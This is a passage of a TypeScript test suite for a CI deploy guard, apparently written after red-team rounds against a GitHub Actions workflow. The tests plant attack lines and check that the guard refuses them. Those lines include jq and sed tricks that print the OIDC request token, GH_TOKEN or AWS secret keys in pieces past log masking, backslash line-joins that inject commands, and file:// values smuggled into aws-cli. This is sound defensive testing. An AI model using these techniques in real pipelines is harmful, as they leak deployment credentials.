      expect(planted, added).toContain(`${DEPLOY}: DPW-07 ${records}: ${TRACE}`)
      expect(refusedAs(planted, `DPW-07 ${records}`), added).toBe(true)
    }
    expect(maskingFindings(workflows)).toEqual([])
  }, 60_000)

  // COMMANDS-A3-01: after STOP_COMMANDS's echo, bash's $_ holds its last word, ::stop-commands:: and the token, so
  // two lines of a run's own (jq printing ::<token>:: from "$_", and _=x to make _ a name the run owns) resumed
  // workflow commands in nonprod's and prod's image step, and the image archive's ##[add-mask] reached the runner.
  // _ is now one of bash's own variables, which no line assigns, and no run's own line expands one of them.
  it('assigns and expands none of bash’s own variables, $_ among them, on a run’s own lines (COMMANDS-A3-01)', () => {
    for (const [line, what] of [
      ['echo "$_"', "an expansion of one of bash's own variables"],
      ['X=$_', "an expansion of one of bash's own variables"],
      [`echo "$\{_}"`, "an expansion of one of bash's own variables"],
      ['echo "$BASH_COMMAND"', "an expansion of one of bash's own variables"],
      ['echo "$REPLY"', "an expansion of one of bash's own variables"],
      ['_=x', "an assignment to one of bash's own variables"],
      ['for _ in a; do\n  echo x\ndone', "an assignment to one of bash's own variables"],
      ['local _', 'a builtin given what the table does not name'],
      ['mapfile -t _ < <(echo x)', 'a builtin given what the table does not name'],
    ] as const) {
      expect(readShell(line).refused?.what, line).toBe(what)
    }
    for (const line of ['echo "$_x"', 'echo "$x_"', '_x=1']) expect(readShell(line).refused, line).toBeUndefined()
    // Through deploy.yml: the attack's two lines in nonprod's image step.
    const call = '          check_image_archive "$RUNNER_TEMP/image/image.tar"\n'
    const unpack = '          unpack_image "$RUNNER_TEMP/image/image.tar" "$RUNNER_TEMP/image-layout"\n'
    const jq = `          jq -n -r --arg x "$_" '$x | split("::") | "::" + .[2] + "::"' >&2\n`
    const step = stepText(deployText, 'nonprod', 'Check and unpack the image')
    const planted = withText(
      DEPLOY,
      edited(
        deployText,
        step,
        edited(edited(step, call, `${jq}${call}`), unpack, `${unpack}          _=x\n`),
        job('nonprod'),
      ),
    )
    expect(
      refusedAs(credentialedCodeFindings(planted, manifests, lockfile), 'DPW-10 nonprod (Check and unpack the image)'),
    ).toBe(true)
    // In a canonical text, _ is assigned in no spelling, and $_ is no name the text sets.
    const anchor = '  local root dir file path manifests=0 queue stackfiles'
    for (const added of ['  _=x', '  local _', '  for _ in a; do :; done', `  : "$\{_:=x}"`]) {
      const { planted: text, line } = plantAfter(ASSET_CHECK, anchor, added)
      expect(canonicalTextFindings({ ASSET_CHECK: text }), added).toContain(canonical('ASSET_CHECK', line, COMMANDS))
    }
    const { planted: text, line } = plantAfter(ASSET_CHECK, anchor, `  echo "$_"`)
    expect(canonicalTextFindings({ ASSET_CHECK: text })).toContain(canonical('ASSET_CHECK', line, EXPANDS, 'DPW-07'))
    expect(credentialedCodeFindings(workflows, manifests, lockfile)).toEqual([])
    expect(canonicalTextFindings()).toEqual([])
  }, 60_000)
})

describe('Round 9, attack 4: the ways past the allowlist (DPW-07, DPW-10)', () => {
  const SHELL = (name: string) => `${GUARD}: DPW-10 ${name}: is written in the shell shellViews() reads`
  const OWN =
    "expands on its own lines only a name its step's or job's env: sets (never GH_TOKEN, which gh reads itself), one its run sets, a function's argument, the last status or the runner's outputs, summary, folder and run ids, so no line reads the OIDC request token or another credential the runner hands it"
  const own = (where: string) => `${DEPLOY}: DPW-07 ${where}: ${OWN}`

  // COMMANDS-A4-01 and EXPAND-A4-02: the runner hands a step its credentials by name (the OIDC request token and
  // its URL, the AWS session, the job's token), which a jq split or a sed spacing prints in pieces no mask
  // matches. A credentialed run's own ACTIONS_ID_TOKEN_REQUEST_TOKEN='' made the token's name the run's own, so
  // a jq before it handed the live token on; and the gate's and prod-gate's own lines, which DPW-07 held to their
  // own names only in credentialed and record jobs, spaced out GH_TOKEN with sed. A name the runner hands a step
  // is now never the run's own but RUNNER_EXPANSIONS, however it is set, and the rule holds every job.
  it('expands on a run’s own lines no name the runner hands a step but RUNNER_EXPANSIONS, in every job (COMMANDS-A4-01, EXPAND-A4-02)', () => {
    // EXPAND-A4-02's line in the gate's and prod-gate's records steps.
    const token = `          echo "$GH_TOKEN" | sed 's/./& /g'\n`
    expect(
      maskingFindings(
        addedBefore(
          'gate',
          'The release, migration and restore records',
          '          for environment in nonprod prod; do\n',
          token,
        ),
      ),
    ).toEqual([own('gate (The release, migration and restore records)')])
    expect(
      maskingFindings(
        addedBefore(
          'prod-gate',
          "Prod's release records",
          `          gh api "repos/$REPO/deployments?environment=prod&task=hearth-release&per_page=100" >"$RUNNER_TEMP/records/release-prod.json"\n`,
          token,
        ),
      ),
    ).toEqual([own("prod-gate (Prod's release records)")])
    // COMMANDS-A4-01's two lines in the release step of every job that holds the OIDC request token, and the same
    // with the name set by a for loop or mapfile instead, or another of the runner's names.
    const next = '          if [ "$BUILD" = true ]; then DIGEST=$BUILD_DIGEST; fi\n'
    const split = (name: string) => `          jq -nc --arg t "$${name}" '$t | split("")' >&2\n`
    for (const id of ['nonprod', 'prod-plan', 'prod']) {
      for (const [name, setter] of [
        ['ACTIONS_ID_TOKEN_REQUEST_TOKEN', "ACTIONS_ID_TOKEN_REQUEST_TOKEN=''"],
        ['ACTIONS_ID_TOKEN_REQUEST_TOKEN', 'for ACTIONS_ID_TOKEN_REQUEST_TOKEN in x; do echo x; done'],
        ['ACTIONS_ID_TOKEN_REQUEST_URL', 'mapfile -t ACTIONS_ID_TOKEN_REQUEST_URL < <(echo x)'],
        ['GH_TOKEN', "GH_TOKEN=''"],
        ['INPUT_X', "INPUT_X=''"],
      ] as const) {
        const release = addedBefore(id, 'The release this job deploys', next, `${split(name)}          ${setter}\n`)
        expect(maskingFindings(release), `${id}: ${name}`).toEqual([own(`${id} (The release this job deploys)`)])
      }
    }
    // The runner's outputs, summary, folder, run ids and address are still a run's own in every job.
    expect(maskingFindings(workflows)).toEqual([])
  }, 60_000)

  // EXPAND-A4-01: inside double quotes bash removes a backslash and the line break after it, so a $ ending one
  // line of a canonical text joined the next line's (cmd), {NAME} or ((…)): TASKS_OUTPUTS ran a command, or
  // printed an AWS secret spaced out, in every rule's blind spot, since the code view writes the quoted pair as
  // text. readsAsBash() now refuses a backslash at a line's end anywhere in a canonical text as written.
  it('refuses a backslash at a line’s end in a canonical text, quoted or not (EXPAND-A4-01)', () => {
    const anchor = '  local outputs kind definition\n'
    expect(TASKS_OUTPUTS).toContain(anchor)
    for (const added of [
      '  echo "tasks: Hearth-$STAGE-Tasks $\\\n(touch "$RUNNER_TEMP/pwn")" | mask\n',
      '  echo "tasks: Hearth-$STAGE-Tasks, read by $\\\n{AWS_SECRET_ACCESS_KEY//?/& }" | mask\n',
      '  echo "tasks: $\\\n((1 + 1))" | mask\n',
      '  echo "tasks: Hearth-$STAGE-Tasks \\\nhas no outputs" | mask\n',
      "  echo 'tasks: \\\nx' | mask\n",
    ]) {
      const planted = TASKS_OUTPUTS.replace(anchor, `${anchor}${added}`)
      expect(canonicalTextFindings({ TASKS_OUTPUTS: planted }), added).toContain(SHELL('TASKS_OUTPUTS'))
    }
    expect(canonicalTextFindings()).toEqual([])
  })
})

describe('Round 10, attack 1: the ways past the allowlist (DPW-10)', () => {
  const READER =
    "hands read -r, after IFS= or IFS=$'\\t', and mapfile and readarray -t, so no backslash in what it reads escapes a character or joins two lines into one, no line is trimmed and no element keeps its line break"
  const AWS_NAMES =
    "sets a name an aws value starts with, or one it is read from, only on its text's own lines, from an aws call by the stage's names, a literal, the job's env or a function's argument, which only that function's own calls, as written, hand it, and reads one only in a loop fed by its own done line, so no value from elsewhere (a stack's outputs, say) reaches aws, where a file:// would load a file"
  const canonical = (name: string, line: number, rule: string) => `${GUARD}: DPW-10 ${name}, line ${line}: ${rule}`
  const lineOf = (text: string, line: string) => text.split('\n').indexOf(line) + 1

  // EXPAND-A1-01: without -r, read takes a backslash as an escape and one at a line's end as joining the line to
  // the next, so ASSET_CHECK's loop over each asset manifest's paths, given one path ending in a backslash, read
  // it and the next as one path inside the assembly while the CLI read the second, outside it. Every read in a
  // canonical text now runs with -r after IFS= or IFS=$'\t', and mapfile and readarray with -t.
  it('hands every read -r after IFS=, and mapfile -t (EXPAND-A1-01)', () => {
    const loop = '      while IFS= read -r path; do'
    expect(ASSET_CHECK.split('\n')).toContain(loop)
    for (const to of [
      '      while IFS= read path; do',
      '      while read -r path; do',
      '      while IFS=, read -r path; do',
      '      while IFS= read -e path; do',
    ]) {
      const text = ASSET_CHECK.replace(`${loop}\n`, `${to}\n`)
      expect(canonicalTextFindings({ ASSET_CHECK: text }), to).toContain(
        canonical('ASSET_CHECK', lineOf(text, to), READER),
      )
    }
    const arns = `  mapfile -t TASK_ARNS < <(jq -r '.[]' <<<"$ARNS")`
    expect(PROBE.split('\n')).toContain(arns)
    const kept = `  mapfile TASK_ARNS < <(jq -r '.[]' <<<"$ARNS")`
    const probe = PROBE.replace(arns, kept)
    expect(canonicalTextFindings({ PROBE: probe })).toContain(canonical('PROBE', lineOf(probe, kept), READER))
    // The rule on its own.
    for (const text of [
      'while IFS= read -r x; do :; done < <(echo)',
      "IFS=$'\\t' read -r a b <<<x",
      'mapfile -t a < <(echo)',
      'readarray -t a < <(echo)',
    ]) {
      expect(readerLines(text), text).toEqual([])
    }
    for (const text of [
      'read x',
      'read -r x',
      'IFS= read x',
      'IFS=: read -r x',
      'IFS= read -ra x',
      'mapfile a',
      'readarray -s1 a',
    ]) {
      expect(readerLines(text), text).toEqual([0])
    }
    for (const text of Object.values(CANONICAL_BY_NAME())) expect(readerLines(text)).toEqual([])
    expect(canonicalTextFindings()).toEqual([])
  })

  // FLOW-A1-01: AWS_CHECK's loop read td, which it hands aws ecs describe-task-definition, from whatever its done
  // line fed it, and the rules held which names an aws value expands, not where each was set: a done line fed
  // from the Services stack's outputs, which a release writes, had aws-cli load a file:// value (the runner's
  // environment) and send it to ECS. Each such name, and each it is read from, is now set only on its text's own
  // lines and read only in its own loop; AWS_CHECK also refuses a td of another shape (its harness case), and
  // ASSET_CHECK an output the synth never writes (the DPW-14 cases).
  it("sets each name an aws value is read from only on its text's own lines (FLOW-A1-01)", () => {
    const loop = '      while IFS= read -r td; do'
    const done = `      done < <(jq -r '.services[]' <<<"$out")`
    expect(AWS_CHECK.split('\n')).toContain(loop)
    expect(AWS_CHECK.split('\n')).toContain(done)
    // The attack's own lines: the loop fed from the Services stack's outputs.
    const outputs = `      defs=$(get aws cloudformation describe-stacks --stack-name "Hearth-$stage-Services" --query 'Stacks[0].Outputs[?OutputKey!=\`Release\`].OutputValue' --output json)`
    const fed = `      done < <(jq -r '.[]' <<<"$defs")`
    const planted = AWS_CHECK.replace(`${loop}\n`, `${outputs}\n${loop}\n`).replace(done, fed)
    expect(canonicalTextFindings({ AWS_CHECK: planted })).toContain(
      canonical('AWS_CHECK', lineOf(planted, fed), AWS_NAMES),
    )
    // A setting line of one of the names that its text doesn't hold, in each text that sets them.
    const anchors: Readonly<Record<string, string>> = {
      AWS_CHECK: loop,
      TASKS_OUTPUTS: '  CLUSTER=$(output Cluster)',
      ONE_OFF: `  task=$(jq -r '.tasks[0]' <<<"$placed")`,
      PROBE: `  mapfile -t TASK_ARNS < <(jq -r '.[]' <<<"$ARNS")`,
    }
    for (const [name, added, replace] of [
      ['AWS_CHECK', `        td=$(jq -r '.[0]' <<<"$out")`, false],
      ['AWS_CHECK', `        printf -v td '%s' "$out"`, false],
      ['AWS_CHECK', `        IFS= read -r td <<<"$out"`, false],
      ['TASKS_OUTPUTS', '  CLUSTER=$(output Release)', true],
      ['TASKS_OUTPUTS', '  local td=$1', false],
      ['ONE_OFF', `  task=$(jq -r '.tasks[1]' <<<"$placed")`, true],
      ['PROBE', `  mapfile -t TASK_ARNS < <(jq -r '.[]' <<<"$OVERRIDES")`, true],
      ['PROBE', '  for TASK_ARNS in x; do :; done', false],
    ] as const) {
      const anchor = anchors[name] ?? ''
      const texts = CANONICAL_BY_NAME()
      const before = texts[name] ?? ''
      expect(before.split('\n'), name).toContain(anchor)
      const text = before.replace(anchor, replace ? added : `${anchor}\n${added}`)
      expect(awsNameLines(text, name), added).toContain(lineOf(text, added) - 1)
      expect(canonicalTextFindings({ [name]: text }), added).toContain(canonical(name, lineOf(text, added), AWS_NAMES))
    }
    for (const [name, text] of Object.entries(CANONICAL_BY_NAME())) expect(awsNameLines(text, name), name).toEqual([])
    expect(canonicalTextFindings()).toEqual([])
  })

  // Round 11: the drift lookup's "imageDigest=${digests[0]}" and ecr_has's "imageDigest=$2" expanded names no rule
  // held to their lines: digests set from the Services stack's outputs, or that output handed ecr_has, reached aws
  // as imageTag@=file://…, which aws-cli loads. digests, image, RUN, RELEASE and PREVIOUS are now held names, a
  // function an aws value reads an argument of is called only on its written lines, and a positional aws value
  // stands only on its own.
  it("hands aws a function's argument only from that function's own calls (round 11)", () => {
    const running = `      running=$(printf '%s\\n' "$\{digests[@]}" | sort -u)`
    const stacked = `      stacked=$(get aws cloudformation describe-stacks --stack-name "Hearth-$stage-Services" --query 'Stacks[0].Outputs[?OutputKey!=\`Release\`].OutputValue' --output json)`
    const call = 'one_off_end probe "$PROBE_LINES" "$RUN"'
    const runTask = RUN_TASK_PROBE
    const texts = CANONICAL_BY_NAME()
    expect(AWS_CHECK.split('\n')).toContain(running)
    expect((texts.PROBE ?? '').split('\n')).toContain(call)
    expect((texts.PROBE ?? '').split('\n')).toContain(runTask)
    for (const [name, anchor, added] of [
      ['AWS_CHECK', running, `      digests=("$(jq -r '.[0]' <<<"$stacked")")`],
      ['AWS_CHECK', running, `      digests[0]=$(jq -r '.[0]' <<<"$stacked")`],
      ['AWS_CHECK', running, `      image=$(jq -r '.[0]' <<<"$stacked")`],
      ['AWS_CHECK', running, `      ecr_has "$\{release%%:*}" "$(jq -r '.[0]' <<<"$stacked")" || true`],
      ['AWS_CHECK', running, `      RELEASE=$(jq -r '.[0]' <<<"$stacked")`],
      [
        'AWS_CHECK',
        running,
        `      tags=$(get aws ecr describe-images --repository-name hearth-server --image-ids "imageDigest=$2" --query 'imageDetails[0].imageTags' --output json) || true`,
      ],
      ['PROBE', call, 'one_off_end probe "$PROBE_LINES" "$OVERRIDES"'],
      ['PROBE', runTask, `RUN=$(jq -c . <<<"$OVERRIDES")`],
    ] as const) {
      const before = texts[name] ?? ''
      const text = before.replace(
        anchor,
        name === 'AWS_CHECK' ? `${anchor}\n${stacked}\n${added}` : `${anchor}\n${added}`,
      )
      expect(awsNameLines(text, name), added).toContain(lineOf(text, added) - 1)
      expect(canonicalTextFindings({ [name]: text }), added).toContain(canonical(name, lineOf(text, added), AWS_NAMES))
    }
    // A function of its own that hands aws its argument, and the line ecr_has calls written elsewhere.
    const own = AWS_CHECK.replace(
      running,
      `${running}\n      lookup() { get aws ecr describe-images --repository-name hearth-server --image-ids "imageDigest=$2" --query 'imageDetails[0].imageTags' --output json; }`,
    )
    expect(awsNameLines(own, 'AWS_CHECK')).toContain(lineOf(own, running))
    expect(awsNameLines(AWS_CHECK, 'TASKS_OUTPUTS').length).toBeGreaterThan(0)
  })
})

describe('Round 10, attack 2: the ways past the allowlist (DPW-10, DPW-14)', () => {
  const ENV =
    'sets only the environment variables the workflow uses, each to the value STEP_ENVS names (a job, STAGE alone): no BASH_ENV, PATH or NODE_OPTIONS, and no input from another step, job or context'
  const dpw10 = (where: string, rule: string) => `${DEPLOY}: DPW-10 ${where}: ${rule}`
  const credentialed = (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile)
  const jobs = workflowJobs(deployText)
  const jobOf = (id: string) => {
    const found = jobs.find(each => each.id === id)
    if (found === undefined) throw new Error(`no job ${id}`)
    return found
  }
  // When this run makes each artifact, from the gate's outputs alone: the synth's assembly always (every job
  // that downloads it needs the synth's success, and its upload has no if:), the image when the gate builds
  // one, and an environment's previous assembly when the gate names a previous release.
  const MADE_WHEN: Readonly<Record<string, string | undefined>> = {
    'needs.synth.outputs.assembly': undefined,
    'needs.build.outputs.image': "needs.gate.outputs.build == 'true'",
    'needs.synth-previous-nonprod.outputs.assembly': "needs.gate.outputs.previous_nonprod_commit != ''",
    'needs.synth-previous-prod.outputs.assembly': "needs.gate.outputs.previous_prod_commit != ''",
  }
  const DUE_SUFFIX = " && 'true' || 'false' }}"
  // A due word's value as GitHub renders it, for the gate outputs given: true, or its condition read by the
  // guard's own evaluateIf, which must know it.
  const dueOf = (value: string, known: Readonly<Record<string, string>>) => {
    if (value === 'true') return 'true'
    expect(value.startsWith('${{ ') && value.endsWith(DUE_SUFFIX), value).toBe(true)
    const verdict = evaluateIf(`\${{ ${value.slice(4, -DUE_SUFFIX.length)} }}`, known)
    expect(verdict, value).toBeDefined()
    return String(verdict)
  }
  const gate = (outputs: Readonly<Record<string, string>>) =>
    Object.fromEntries(Object.entries(outputs).map(([key, value]) => [`needs.gate.outputs.${key}`, value]))
  const COMMIT = 'a'.repeat(40)

  // FLOW-A2-01: prod's previous release, rebuilt in synth-previous-prod, replaced the upload action on disk, so
  // that job succeeded with no artifact id; prod-plan read the empty id as no previous release, skipped the
  // previous assembly's ASSET_CHECK and the rollback diff, and the approval went ahead with a rollback that
  // could only fail. Each call now says whether this run makes its artifact for the job, from the gate's
  // outputs, and an empty id passes only where it doesn't.
  it('names each artifact a job downloads as due wherever the gate says this run makes it (FLOW-A2-01)', () => {
    // MADE_WHEN is the workflow's own: each upload's if: is that condition, or the build job's if: ends with it.
    for (const [output, made] of Object.entries(MADE_WHEN)) {
      const [, from, name] = /^needs\.([\w-]+)\.outputs\.(\w+)$/.exec(output) ?? []
      const stepId = /^\$\{\{ steps\.([\w-]+)\.outputs\.artifact-id \}\}$/.exec(
        JOB_OUTPUTS[from ?? '']?.[name ?? ''] ?? '',
      )?.[1]
      const producer = jobOf(from ?? '')
      const upload = parsedSteps(producer).find(step => step.id === stepId)
      expect(upload?.uses?.startsWith('actions/upload-artifact@'), output).toBe(true)
      if (made === undefined || from === 'build') expect(upload?.if, output).toBeUndefined()
      else expect(upload?.if, output).toBe(`\${{ ${made} }}`)
      if (from === 'build') expect(jobScalar(producer, 'if')?.endsWith(` && ${made} }}`), output).toBe(true)
    }
    expect(Object.keys(DUE_ENVS).sort()).toEqual(['nonprod', 'prod', 'prod-plan'])
    for (const [id, calls] of Object.entries(ARTIFACT_CALLS)) {
      const consumer = jobOf(id)
      const steps = parsedSteps(consumer)
      const env = STEP_ENVS[id]?.[ARTIFACTS_STEP] ?? {}
      for (const call of calls) {
        const [, variable, word] = /^artifact_named "\$(\w+)" \S+ (true|"\$\w+")$/.exec(call) ?? []
        expect(word, call).toBeDefined()
        const ids = env[variable ?? ''] ?? ''
        const made = MADE_WHEN[/^\$\{\{ (\S+) \}\}$/.exec(ids)?.[1] ?? '']
        const download = steps.find(step => step.with.get('artifact-ids') === ids)
        expect(download, call).toBeDefined()
        const condition = download?.if ?? ''
        const own = `\${{ ${ids.slice(4, -3)} != ''`
        expect(condition.startsWith(own), call).toBe(true)
        const rest = condition.slice(own.length, -3)
        if (word === 'true') {
          // Always due: the synth's assembly, or a rollback job's previous one, which runs only when the gate
          // allows its rollback, which it does only beside a previous release.
          const rollback = new RegExp(`needs\\.gate\\.outputs\\.rollback_${id.replace('rollback-', '')} == 'true'`)
          expect(
            made === undefined || (id.startsWith('rollback-') && rollback.test(jobScalar(consumer, 'if') ?? '')),
            call,
          ).toBe(true)
          expect(rest, call).toBe('')
        } else {
          // Due exactly where the artifact's upload runs and its download would, with an id.
          const name = word?.slice(2, -1) ?? ''
          expect(name.endsWith('_DUE'), call).toBe(true)
          expect(env[name], call).toBe(`\${{ ${made}${rest}${DUE_SUFFIX}`)
          expect(DUE_ENVS[id]?.[name], call).toBe(env[name])
        }
      }
    }
  })

  it('stops a credentialed job at the artifacts’ names when an artifact this run makes has no id (FLOW-A2-01)', () => {
    const dir = mkdtempSync(join(tmpdir(), 'hearth-r10-names-'))
    try {
      // A stand-in gh: records the endpoint it is asked for and answers this run's artifacts by their ids.
      writeFileSync(
        join(dir, 'gh'),
        [
          '#!/bin/bash',
          'printf \'%s\\n\' "$2" >>"$GH_CALLS"',
          'case "$2" in',
          '  */artifacts/42) echo "assembly 7" ;;',
          '  */artifacts/43) echo "assembly-previous-prod 7" ;;',
          '  */artifacts/44) echo "image.tar 7" ;;',
          '  */artifacts/45) echo "assembly-previous-nonprod 7" ;;',
          '  *) exit 1 ;;',
          'esac',
          '',
        ].join('\n'),
        { mode: 0o755 },
      )
      // The job's pinned run, with its env as GitHub renders it for these gate outputs and these ids.
      const run = (id: string, outputs: Readonly<Record<string, string>>, ids: Readonly<Record<string, string>>) => {
        const calls = join(dir, `calls-${Math.random().toString(36).slice(2)}`)
        writeFileSync(calls, '')
        const known = gate(outputs)
        const rendered = Object.fromEntries(
          Object.entries(DUE_ENVS[id] ?? {}).map(([name, value]) => [name, dueOf(value, known)]),
        )
        const result = spawnSync('bash', ['-c', artifactNamesRun(id)], {
          encoding: 'utf8',
          env: {
            PATH: `${dir}:/usr/bin:/bin`,
            REPO: 'owner/repo',
            GITHUB_RUN_ID: '7',
            GH_TOKEN: 'fictional',
            GH_CALLS: calls,
            ...rendered,
            ...ids,
          },
        })
        const said = result.stdout
          .split('\n')
          .filter(line => line !== '' && !line.startsWith('::stop-commands::'))
          .join('\n')
        const asked = readFileSync(calls, 'utf8').trim()
        return {
          status: result.status,
          said,
          asked: asked === '' ? [] : asked.split('\n').map(each => each.split('/').pop()),
        }
      }
      const deploy = { mode: 'deploy', target: 'prod', build: 'true', previous_prod_commit: COMMIT }
      // The attack: prod has a previous release, and synth-previous-prod's output is empty. prod-plan's
      // download of it, and so its check and the rollback diff, would skip; the names step now stops first.
      const downloadIf = parsedSteps(jobOf('prod-plan')).find(
        step => step.name === "Download prod's previous assembly",
      )?.if
      expect(evaluateIf(downloadIf ?? '', { ...gate(deploy), 'needs.synth-previous-prod.outputs.assembly': '' })).toBe(
        false,
      )
      expect(run('prod-plan', deploy, { ASSEMBLY_ID: '42', PREVIOUS_ID: '' })).toEqual({
        status: 1,
        said: 'artifacts: this run makes assembly-previous-prod for this job, and its id is empty',
        asked: ['42'],
      })
      expect(run('prod-plan', deploy, { ASSEMBLY_ID: '42', PREVIOUS_ID: '43' })).toEqual({
        status: 0,
        said: '',
        asked: ['42', '43'],
      })
      // Prod's first deploy, a dispatched rollback and a restore have no previous release: no previous id.
      for (const outputs of [
        { ...deploy, previous_prod_commit: '' },
        { mode: 'rollback', target: 'prod', build: 'false', previous_prod_commit: '' },
        { mode: 'deploy', target: 'restore', build: 'false', previous_prod_commit: '' },
      ]) {
        expect(run('prod-plan', outputs, { ASSEMBLY_ID: '42', PREVIOUS_ID: '' }), JSON.stringify(outputs)).toEqual({
          status: 0,
          said: '',
          asked: ['42'],
        })
      }
      // A rollback job always needs its previous assembly.
      for (const [id, previous] of [
        ['rollback-prod', '43'],
        ['rollback-nonprod', '45'],
      ] as const) {
        const name = `assembly-previous-${id.replace('rollback-', '')}`
        expect(run(id, deploy, { PREVIOUS_ID: '' }), id).toEqual({
          status: 1,
          said: `artifacts: this run makes ${name} for this job, and its id is empty`,
          asked: [],
        })
        expect(run(id, deploy, { PREVIOUS_ID: previous }), id).toEqual({ status: 0, said: '', asked: [previous] })
      }
      // The image, where the gate builds one; and the synth's assembly, always.
      for (const id of ['nonprod', 'prod']) {
        expect(run(id, deploy, { ASSEMBLY_ID: '42', IMAGE_ID: '' }), id).toEqual({
          status: 1,
          said: 'artifacts: this run makes image.tar for this job, and its id is empty',
          asked: ['42'],
        })
        expect(run(id, deploy, { ASSEMBLY_ID: '42', IMAGE_ID: '44' }), id).toEqual({
          status: 0,
          said: '',
          asked: ['42', '44'],
        })
        expect(
          run(id, { mode: 'rollback', target: id, build: 'false' }, { ASSEMBLY_ID: '42', IMAGE_ID: '' }),
          id,
        ).toEqual({
          status: 0,
          said: '',
          asked: ['42'],
        })
        expect(run(id, deploy, { ASSEMBLY_ID: '', IMAGE_ID: '44' }), id).toEqual({
          status: 1,
          said: 'artifacts: this run makes assembly for this job, and its id is empty',
          asked: [],
        })
      }
      expect(
        run('prod', { mode: 'deploy', target: 'restore', build: 'false' }, { ASSEMBLY_ID: '42', IMAGE_ID: '' }),
      ).toEqual({ status: 0, said: '', asked: ['42'] })
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  it('refuses a due word turned false, dropped or read from elsewhere (FLOW-A2-01)', () => {
    const due = DUE_ENVS['prod-plan']?.PREVIOUS_DUE ?? ''
    expect(deployText).toContain(`          PREVIOUS_DUE: ${due}\n`)
    for (const to of [
      `          PREVIOUS_DUE: 'false'\n`,
      `          PREVIOUS_DUE: \${{ needs.synth-previous-prod.outputs.assembly != '' && 'true' || 'false' }}\n`,
      '',
    ]) {
      expect(credentialed(plant(`          PREVIOUS_DUE: ${due}\n`, to, job('prod-plan'))), to).toContain(
        dpw10(`prod-plan (${ARTIFACTS_STEP})`, ENV),
      )
    }
    // The call's word, and the function's own refusal, are the pinned run's: changing either changes it.
    for (const [from, to] of [
      [
        'artifact_named "$PREVIOUS_ID" assembly-previous-prod "$PREVIOUS_DUE"\n',
        'artifact_named "$PREVIOUS_ID" assembly-previous-prod false\n',
      ],
      ['            if [ "$3" = false ]; then return 0; fi\n', '            return 0\n'],
    ] as const) {
      expect(credentialed(plant(from, to, job('prod-plan'))), to).not.toEqual([])
    }
    expect(credentialed(workflows)).toEqual([])
  }, 30_000)
})

// PLAN_BASIS (DPW-08; T24 item 20; round 11): a prod approval was tied to prod-plan's diff by the attempt and by
// prod's newest record alone, so a rollback that moved prod after prod-plan diffed it, recorded before prod-gate
// read or not yet recorded, had prod deploy its release over a state the approved diff never showed. prod-plan
// now reads each stack of its stage before it diffs (refusing one still moving) and outputs that read; prod's
// What runs reads the same first and refuses unless it is equal. Run with bash against a stand-in aws answering
// describe-stacks from the case's statuses and times.
describe('DPW-08: prod deploys only the stage prod-plan diffed (PLAN_BASIS, round 11)', () => {
  const STUB = `aws() {
  printf '%s\\n' "$*" >>"$AWS_LOG"
  local part=''
  case "$*" in
    'cloudformation describe-stacks --stack-name Hearth-'*) part=$4; part=\${part##*-} ;;
    *) echo 'unexpected call' >&2; return 254 ;;
  esac
  local name="STACK_$part"
  case "\${!name:-}" in
    none) echo "An error occurred (ValidationError): Stack with id $4 does not exist" >&2; return 254 ;;
    broken) echo 'An error occurred (Throttling): Rate exceeded' >&2; return 254 ;;
    *) printf '%s\\n' "\${!name:-}" ;;
  esac
}`
  const T1 = '2026-11-20T10:00:00.123000+00:00'
  const T2 = '2026-11-24T09:30:00.456000+00:00'
  const settled: Record<string, string> = {
    STACK_Platform: JSON.stringify(['UPDATE_COMPLETE', T1]),
    STACK_Data: JSON.stringify(['UPDATE_COMPLETE', T1]),
    STACK_Tasks: JSON.stringify(['UPDATE_COMPLETE', T1]),
    STACK_Services: JSON.stringify(['UPDATE_COMPLETE', T1]),
  }
  const BASIS = `Platform:UPDATE_COMPLETE@${T1},Data:UPDATE_COMPLETE@${T1},Tasks:UPDATE_COMPLETE@${T1},Services:UPDATE_COMPLETE@${T1},`
  function run(text: string, env: Record<string, string>) {
    const scratch = mkdtempSync(join(tmpdir(), 'hearth-basis-'))
    try {
      const output = join(scratch, 'output')
      const summary = join(scratch, 'summary')
      const log = join(scratch, 'aws.log')
      for (const file of [output, summary, log]) writeFileSync(file, '')
      const result = spawnSync('bash', ['-c', `${STUB}\n${text}`], {
        encoding: 'utf8',
        env: {
          PATH: process.env.PATH ?? '',
          HOME: scratch,
          RUNNER_TEMP: scratch,
          GITHUB_OUTPUT: output,
          GITHUB_STEP_SUMMARY: summary,
          AWS_LOG: log,
          STAGE: 'prod',
          MODE: 'deploy',
          RESTORE: '',
          ...settled,
          ...env,
        },
      })
      return {
        status: result.status,
        said: `${result.stdout}${result.stderr}`,
        output: readFileSync(output, 'utf8'),
        calls: readFileSync(log, 'utf8').trim().split('\n').filter(Boolean),
      }
    } finally {
      rmSync(scratch, { recursive: true, force: true })
    }
  }
  const plan = (env: Record<string, string>) => run(`${PREAMBLE}\n${PLAN_BASIS}\nplan_basis plan`, env)
  const check = (env: Record<string, string>) => run(`${PREAMBLE}\n${PLAN_BASIS}\nplan_basis check`, env)

  it('reads each stack before the diff, refusing one still moving, and outputs what it read', () => {
    expect(plan({})).toMatchObject({ status: 0, output: `basis=${BASIS}\n` })
    // A stack never updated answers with its creation time; one missing, or one a create that never ran left, is
    // read as it stands.
    const first = plan({
      STACK_Platform: JSON.stringify(['CREATE_COMPLETE', T1]),
      STACK_Services: 'none',
      STACK_Tasks: JSON.stringify(['REVIEW_IN_PROGRESS', T1]),
    })
    expect(first.status).toBe(0)
    expect(first.output).toBe(
      `basis=Platform:CREATE_COMPLETE@${T1},Data:UPDATE_COMPLETE@${T1},Tasks:REVIEW_IN_PROGRESS@${T1},Services:missing,\n`,
    )
    for (const moving of ['UPDATE_IN_PROGRESS', 'UPDATE_ROLLBACK_IN_PROGRESS', 'UPDATE_COMPLETE_CLEANUP_IN_PROGRESS']) {
      const refused = plan({ STACK_Tasks: JSON.stringify([moving, T2]) })
      expect(refused.status, moving).toBe(1)
      expect(refused.output, moving).toBe('')
      expect(refused.said, moving).toContain(`plan-basis: Hearth-prod-Tasks is ${moving}: wait for it to settle`)
    }
    // An answer it can't read, or of another shape, refuses too, and writes no output.
    for (const answer of [
      'broken',
      '"UPDATE_COMPLETE"',
      JSON.stringify(['UPDATE_COMPLETE', 'file:///etc/hostname']),
      JSON.stringify(['update complete', T1]),
    ]) {
      const refused = plan({ STACK_Data: answer })
      expect(refused.status, answer).toBe(1)
      expect(refused.output, answer).toBe('')
    }
    // A restore taken down reads its stage too (round 11): down's own read is each stack's status alone, which an
